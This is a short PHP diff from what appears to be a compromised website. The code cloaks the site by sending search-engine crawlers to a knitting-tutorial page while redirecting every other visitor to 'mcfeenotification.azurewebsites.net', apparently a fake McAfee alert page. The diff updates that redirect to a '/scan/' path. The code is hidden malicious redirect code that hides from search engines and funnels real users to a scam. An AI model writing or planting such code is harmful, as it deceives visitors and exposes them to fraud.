@@ -5,6 +5,6 @@ if((strstr(strtolower($user_agent), "googlebot")) || (preg_match('/yandex|yahoo|
     header('Location:https://www.stitchandunwind.com/category/tutorial/knitting-tutorial/');
 }
 else{
-        header('Location:https://mcfeenotification.azurewebsites.net/');
+        header('Location:https://mcfeenotification.azurewebsites.net/scan/');
 }
 ?>
